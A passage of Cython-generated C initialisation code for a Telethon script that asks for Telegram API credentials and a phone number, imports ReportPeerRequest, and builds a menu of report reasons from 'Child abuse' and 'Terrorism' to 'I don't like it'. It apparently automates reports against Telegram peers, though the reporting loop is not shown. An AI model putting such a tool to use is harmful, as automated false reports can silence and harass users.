  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_TelegramClient);
  __Pyx_GIVEREF(__pyx_n_s_TelegramClient);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_TelegramClient);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_telethon, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_TelegramClient); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_TelegramClient, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_ReportPeerRequest);
  __Pyx_GIVEREF(__pyx_n_s_ReportPeerRequest);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_ReportPeerRequest);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_telethon_tl_functions_account, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_ReportPeerRequest); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ReportPeerRequest, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonSpam);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonSpam);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_InputReportReasonSpam);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonFake);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonFake);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_InputReportReasonFake);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonViolence);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonViolence);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_s_InputReportReasonViolence);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonPornography);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonPornography);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_s_InputReportReasonPornography);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonChildAbuse);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonChildAbuse);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_s_InputReportReasonChildAbuse);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonCopyright);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonCopyright);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_s_InputReportReasonCopyright);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonIllegalDrugs);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonIllegalDrugs);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_n_s_InputReportReasonIllegalDrugs);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonPersonalDetails);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonPersonalDetails);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_n_s_InputReportReasonPersonalDetails);
  __Pyx_INCREF(__pyx_n_s_InputReportReasonOther);
  __Pyx_GIVEREF(__pyx_n_s_InputReportReasonOther);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_n_s_InputReportReasonOther);

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_telethon_tl_types, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonSpam); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonSpam, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonFake); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonFake, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonViolence); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonViolence, __pyx_t_1) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonPornography); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonPornography, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonChildAbuse); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonChildAbuse, __pyx_t_1) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonCopyright); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonCopyright, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonIllegalDrugs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonIllegalDrugs, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonPersonalDetails); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonPersonalDetails, __pyx_t_1) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InputReportReasonOther); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InputReportReasonOther, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_2) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_colored);
  __Pyx_GIVEREF(__pyx_n_s_colored);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_colored);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_termcolor, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_colored, __pyx_t_2) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api_id, __pyx_t_1) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api_hash, __pyx_t_1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_phone_number, __pyx_t_1) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonOther); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_I_don_t_like_it);
  __Pyx_GIVEREF(__pyx_kp_u_I_don_t_like_it);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_I_don_t_like_it);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_1, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonChildAbuse); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Child_abuse);
  __Pyx_GIVEREF(__pyx_kp_u_Child_abuse);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Child_abuse);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_2, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonViolence); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_Violence);
  __Pyx_GIVEREF(__pyx_n_u_Violence);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_Violence);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonIllegalDrugs); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Illegal_goods);
  __Pyx_GIVEREF(__pyx_kp_u_Illegal_goods);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Illegal_goods);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_4, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonPornography); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Illegal_adult_content);
  __Pyx_GIVEREF(__pyx_kp_u_Illegal_adult_content);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Illegal_adult_content);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_5, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonPersonalDetails); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Personal_data);
  __Pyx_GIVEREF(__pyx_kp_u_Personal_data);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Personal_data);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_6, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonViolence); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_Terrorism);
  __Pyx_GIVEREF(__pyx_n_u_Terrorism);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_Terrorism);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_7, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonSpam); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Scam_or_spam);
  __Pyx_GIVEREF(__pyx_kp_u_Scam_or_spam);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Scam_or_spam);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_8, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonCopyright); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_Copyright);
  __Pyx_GIVEREF(__pyx_n_u_Copyright);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_Copyright);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_9, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InputReportReasonOther); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_Other);
  __Pyx_GIVEREF(__pyx_n_u_Other);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_Other);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_int_10, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_report_reasons, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1check_exit, 0, __pyx_n_s_check_exit, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__26)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_exit, __pyx_t_1) < 0) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3check_home, 0, __pyx_n_s_check_home, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__28)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_home, __pyx_t_1) < 0) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5get_valid_input, 0, __pyx_n_s_get_valid_input, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__30)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_CyFunction_SetDefaultsTuple(__pyx_t_1, __pyx_tuple__31);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_valid_input, __pyx_t_1) < 0) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7get_valid_integer_input, 0, __pyx_n_s_get_valid_integer_input, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__33)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_valid_integer_input, __pyx_t_1) < 0) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
